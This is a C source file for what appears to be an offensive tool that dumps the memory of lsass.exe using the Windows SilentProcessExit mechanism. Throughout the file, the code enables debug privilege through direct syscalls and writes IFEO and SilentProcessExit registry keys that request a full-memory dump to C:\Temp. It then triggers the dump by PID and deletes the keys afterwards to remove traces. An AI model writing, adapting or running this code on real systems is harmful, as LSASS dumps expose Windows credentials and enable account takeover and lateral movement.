#include "silentdump.h"
#include "syscalls-asm.h"


// TODO
// - Fix RtlFreeUnicodeString crash
// - Fix CreateRemotheThread method


// From WdToggle Outflank's project
BOOL SetDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    NTSTATUS status = ZwOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (status != STATUS_SUCCESS)
    {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    LPCWSTR lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid))
    {
        ZwClose(hToken);
        return FALSE;
    }

    status = ZwAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (status != STATUS_SUCCESS)
    {
        ZwClose(hToken);
        return FALSE;
    }

    ZwClose(hToken);

    return TRUE;
}

INT CreateSilentKey()
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    HANDLE IFEOregKeyHandle = NULL;
    UNICODE_STRING IFEORegistryKeyName;
    HANDLE SPEregKeyHandle = NULL;
    HANDLE SPEregKeyHandleSub = NULL;
    UNICODE_STRING SPERegistryKeyName;
    LPWSTR proc = L"lsass.exe";
    INT Error = 0;

    //Util methods
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL)
    {
        fprintf(stderr, "Error GetProcAddress RtlInitUnicodeString\n");
        return 0;
    }

    _RtlAppendUnicodeToString RtlAppendUnicodeToString = (_RtlAppendUnicodeToString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAppendUnicodeToString");
    if (RtlAppendUnicodeToString == NULL)
    {
        fprintf(stderr, "Error GetProcAddress RtlAppendUnicodeToString\n");
        return 0;
    }

    //set up registry key name
    IFEORegistryKeyName.Length = 0;
    IFEORegistryKeyName.MaximumLength = (wcslen(IFEO_REG_KEY) * sizeof(WCHAR)) + (wcslen(proc) * sizeof(WCHAR)) + 2;
    IFEORegistryKeyName.Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, IFEORegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&IFEORegistryKeyName, IFEO_REG_KEY);
    RtlAppendUnicodeToString(&IFEORegistryKeyName, proc);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, &IFEORegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&IFEOregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributes, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr, L"Error registry key %ls : %ld\n", IFEORegistryKeyName.Buffer, Status);
        goto Cleanup;
    }

    fwprintf(stderr, L"Registry key has been created : %ls\n", IFEORegistryKeyName.Buffer);

    // https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
    DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
    UNICODE_STRING GlobalFlagUnicodeStr;
    RtlInitUnicodeString(&GlobalFlagUnicodeStr, L"GlobalFlag");

    Status = ZwSetValueKey(IFEOregKeyHandle, &GlobalFlagUnicodeStr, 0, REG_DWORD, &globalFlagData, sizeof(globalFlagData));

    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr, L"Error registry key %ls : %ld\n", GlobalFlagUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    fwprintf(stderr, L"Registry key value has been created : %ls\n", GlobalFlagUnicodeStr.Buffer);

    //set up registry key name SPE
    SPERegistryKeyName.Length = 0;
    SPERegistryKeyName.MaximumLength = (wcslen(SILENT_PROCESS_EXIT_REG_KEY) * sizeof(WCHAR)) + (wcslen(proc) * sizeof(WCHAR)) + 2;
    SPERegistryKeyName.Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SPERegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributesSPE;
    InitializeObjectAttributes(&ObjectAttributesSPE, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SPEregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributesSPE, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr,  L"Error registry key %ls : %ld\n", SPERegistryKeyName.Buffer, Status);
        goto Cleanup;
    }
    fwprintf(stdout, L"Registry key has been created : %ls\n", SPERegistryKeyName.Buffer);

    RtlAppendUnicodeToString(&SPERegistryKeyName, proc);

    // Creating the registry key
    OBJECT_ATTRIBUTES ObjectAttributesSPESub;
    InitializeObjectAttributes(&ObjectAttributesSPESub, &SPERegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwCreateKey(&SPEregKeyHandleSub, KEY_ALL_ACCESS, &ObjectAttributesSPESub, 0, NULL, REG_OPTION_VOLATILE, 0);

    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr, L"Error registry key %ls : %ld\n", SPERegistryKeyName.Buffer, Status);
        goto Cleanup;
    }

    fwprintf(stdout, L"Registry key has been created : %ls\n", SPERegistryKeyName.Buffer);

    DWORD ReportingMode = MiniDumpWithFullMemory;
    DWORD DumpType = LOCAL_DUMP;

    //TODO
    wchar_t* LocalDumpFolder = L"C:\\Temp\\";

    // Set SilentProcessExit registry values for the target process

    UNICODE_STRING ReportingModeUnicodeStr;
    RtlInitUnicodeString(&ReportingModeUnicodeStr, L"ReportingMode");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &ReportingModeUnicodeStr, 0, REG_DWORD, &ReportingMode, sizeof(DWORD));
    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stdout,  L"Error registry key %ls : %ld\n", ReportingModeUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    fprintf(stdout,  "Sub key ReportingMode has been created\n");

    UNICODE_STRING LocalDumpFolderUnicodeStr;
    RtlInitUnicodeString(&LocalDumpFolderUnicodeStr, L"LocalDumpFolder");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &LocalDumpFolderUnicodeStr, 0, REG_SZ, LocalDumpFolder, (wcslen(LocalDumpFolder) * sizeof(WCHAR)) + 2);
    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr, L"Error registry key %ls : %ld\n", LocalDumpFolderUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    fprintf(stdout,  "Sub key LocalDumpFolder has been created\n");

    UNICODE_STRING DumpTypeUnicodeStr;
    RtlInitUnicodeString(&DumpTypeUnicodeStr, L"DumpType");
    Status = ZwSetValueKey(SPEregKeyHandleSub, &DumpTypeUnicodeStr, 0, REG_DWORD, &DumpType, sizeof(DWORD));
    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr,  L"Error registry key %ls : %ld\n", DumpTypeUnicodeStr.Buffer, Status);
        goto Cleanup;
    }

    fprintf(stdout,  "Sub key DumpType has been created\n");

    if (Status != STATUS_SUCCESS)
    {
        goto Cleanup;
    }

    Error = 1;

Cleanup:
    if (IFEOregKeyHandle != NULL)
    {
        ZwClose(IFEOregKeyHandle);
    }

    if (SPEregKeyHandle != NULL)
    {
        ZwClose(SPEregKeyHandle);
    }

    if (SPEregKeyHandleSub != NULL)
    {
        ZwClose(SPEregKeyHandleSub);
    }

    return Error;
}

INT CleanupKey(PUNICODE_STRING rKeyName)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    HANDLE IFEOregKeyHandle = NULL;
    INT Error = 1;

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, rKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    Status = ZwOpenKey(&IFEOregKeyHandle, KEY_ALL_ACCESS, &ObjectAttributes);
    if (Status != STATUS_SUCCESS)
    {
        fwprintf(stderr,  L"Error GetProcAddress RtlInitUnicodeString\n");

        return 0;
    }

    Status = ZwDeleteKey(IFEOregKeyHandle);

    if (Status != STATUS_SUCCESS)
    {
        Error = 0;
    }

    fwprintf(stdout, L"Status deleted key %ls: %ld\n", rKeyName->Buffer, Status);

    if (IFEOregKeyHandle != NULL)
    {
        ZwClose(IFEOregKeyHandle);
    }

    return Error;
}

INT CleaningAllKeys()
{
    INT CleanResult;

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL)
    {
        fprintf(stderr,  "Error GetProcAddress RtlInitUnicodeString\n");
        return 0;
    }

    _RtlAppendUnicodeToString RtlAppendUnicodeToString = (_RtlAppendUnicodeToString)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAppendUnicodeToString");
    if (RtlAppendUnicodeToString == NULL)
    {
        fprintf(stderr,  "Error GetProcAddress RtlAppendUnicodeToString\n");
        return 0;
    }

    UNICODE_STRING IFEORegistryKeyName;
    LPWSTR proc = L"lsass.exe";

    IFEORegistryKeyName.Length = 0;
    IFEORegistryKeyName.MaximumLength = (wcslen(IFEO_REG_KEY) * sizeof(WCHAR)) + (wcslen(proc) * sizeof(WCHAR)) + 2;
    IFEORegistryKeyName.Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, IFEORegistryKeyName.MaximumLength);

    RtlAppendUnicodeToString(&IFEORegistryKeyName, IFEO_REG_KEY);
    RtlAppendUnicodeToString(&IFEORegistryKeyName, proc);

    CleanResult = CleanupKey(&IFEORegistryKeyName);

    UNICODE_STRING SPERegistryKeyName;
    //set up registry key name SPE
    SPERegistryKeyName.Length = 0;
    SPERegistryKeyName.MaximumLength = (wcslen(SILENT_PROCESS_EXIT_REG_KEY) * sizeof(WCHAR)) + (wcslen(proc) * sizeof(WCHAR)) + 2;
    SPERegistryKeyName.Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SPERegistryKeyName.MaximumLength);
    RtlAppendUnicodeToString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);
    RtlAppendUnicodeToString(&SPERegistryKeyName, proc);

    CleanResult = CleanupKey(&SPERegistryKeyName);

    RtlInitUnicodeString(&SPERegistryKeyName, SILENT_PROCESS_EXIT_REG_KEY);

    CleanResult = CleanupKey(&SPERegistryKeyName);

    return 1;
}

int main(char argc, char** argv)
{
    NTSTATUS Status;
    HANDLE hProcess = NULL;
    DWORD pid;

    if (argc < 2) {

        fprintf(stderr, "usage: %s <pid>\n\n", argv[0]);
        exit(1);
    }

    pid = atoi(argv[1]);

    fwprintf(stdout,  L"Will dump PID: %ld\n", pid);

    // Set Debug Privilege
    if (!SetDebugPrivilege())
    {
        fwprintf(stderr,  L"Failed to set debug privilege.\n");
        return;
    }

    fwprintf(stdout,  L"Start registry key creation\n");

    if (CreateSilentKey() == 0)
    {
        fwprintf(stderr,  L"Error on registry keys creation..exiting.\n");
        return;
    }

    DWORD desiredAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;

    // CreateRemoteThread Method
    //DWORD desiredAccess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

    _RtlReportSilentProcessExit RtlReportSilentProcessExit = (_RtlReportSilentProcessExit)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlReportSilentProcessExit");
    if (RtlReportSilentProcessExit == NULL)
    {
        fwprintf(stderr,  L"Error GetProcAddress RtlReportSilentProcessExit\n");
        return;
    }

    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
    uPid.UniqueThread = (HANDLE)0;

    Status = ZwOpenProcess(&hProcess, desiredAccess, &ObjectAttributes, &uPid);

    if (hProcess == NULL)
    {
        fwprintf(stderr,  L"Open Process error : %ld\n", Status);
        goto Cleanup;
    }

    Status = RtlReportSilentProcessExit(hProcess, 0);

    // Fix this method
    /*HANDLE hThread = NULL;
    Status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              (LPTHREAD_START_ROUTINE)RtlReportSilentProcessExit,  (LPVOID)-1, FALSE, 0, 0, 0, NULL);
    if (hThread == NULL)
    {
        fwprintf(stderr, L"Open Process error : %ld\n", Status);
        return;
    }*/

    fwprintf(stdout,  L"RtlReportSilentProcessExit dump status : %ld\n", Status);

Cleanup:
    if (hProcess != NULL)
        ZwClose(hProcess);

    if (CleaningAllKeys() != 0)
        fwprintf(stdout,  L"All the registry key have been Cleaned!\n");
}